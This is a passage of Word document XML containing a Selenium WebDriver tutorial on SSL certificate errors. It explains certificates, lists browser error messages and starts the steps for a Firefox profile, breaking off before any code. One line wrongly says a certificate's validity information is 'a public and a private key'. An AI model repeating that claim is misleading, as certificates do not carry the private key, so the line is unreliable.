          </w:rPr>
          <w:t>SSL works through a combination of programs and encryption/decryption routine that exist on the web server computer and web server browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="596" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="597" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL certificate basically contains below information.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="112"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="598" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="599" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Subject which is the identity of the website owner.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="112"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="600" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="601" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Validity information- a public and a private key.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="602" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="603" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The Private and public key are two uniquely related cryptographic keys (numbers). Whatever is encrypted by a public key may only be decrypted by a private key.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="604" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B549D50" wp14:editId="6823C23A">
            <wp:extent cx="5029200" cy="3078480"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="57" name="Picture 57" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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9200" cy="3078480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="605" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="606" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>When a secure connection is not established between the server and client due to the certificate, following SSL certificate error will be manifested.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="607" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="608" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of SSL Certificate Error</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="609" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="610" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Suppose you type some https request in the browser and get a message such as "This connection is Untrusted" or the "The site's security certificate is not trusted" depending upon the browser you are using. Then such error is subject to SSL certificate error.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="611" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="612" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Now, if the browser is unable to establish a secured connection with the requested certificate, then the browser will throw "Untrusted Connection" exception as below and ask the user to take appropriate action.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="613" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="614" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The types of error you likely to see due to certificate in different browsers may be somewhat like this</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="113"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="615" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="616" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>FireFox</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> - This connection is untrusted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="114"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="617" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="618" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Google Chrome</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> -This site security is not trusted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="115"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="619" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="620" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Internet Explorer ( IE)</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> - This security certificate presented by this website was not trusted by a trusted certificate authority (CA)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="621" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EDF25CE" wp14:editId="11BA178C">
            <wp:extent cx="6812280" cy="4960620"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="56" name="Picture 56" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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12280" cy="4960620"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="622" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="623" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">How to handle SSL Certificate Error using Selenium </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Webdriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="624" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="625" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Suppose we have written some test scripts and while executing the script, we caught in the situation as "Untrusted Connection" above then how do we handle the exception purely through automation.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="626" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="627" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In such case, we have to adjust our script in such a way that it will take care of SSL Exception by itself.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="628" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="629" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The scripts need to be modified according to the type of browser instance we are using. These when desired capabilities comes in picture.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="630" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="631" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Desired Capabilities is used to configure the driver instance of Selenium </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Webdriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">. Through Desired Capabilities, one can configure all driver </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>instance</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> like </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>ChromeDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>FirefoxDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>, and Internet Explorer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="632" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="633" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>As of now we don't have any specific URL to create the above scenario, but I am providing steps that we can add in the Selenium Script to handle the above situation "Untrusted Connection."</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="634" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="635" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in Firefox</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="636" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="637" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">For handling SSL certificate error in Firefox, we need to use desired capabilities of Selenium </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Webdriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> and follow the following steps.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="638" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="639" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 1)</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">: First we need to create a new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>firefox</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> profile say "</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>myProfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">". You can refer </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>google</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> to learn "How to create" </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>firefox</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> profile. It is simple and easy.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="640" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="641" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 2)</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">: Now access </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>myProfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> in the script as below and create the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>FirefoxProfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
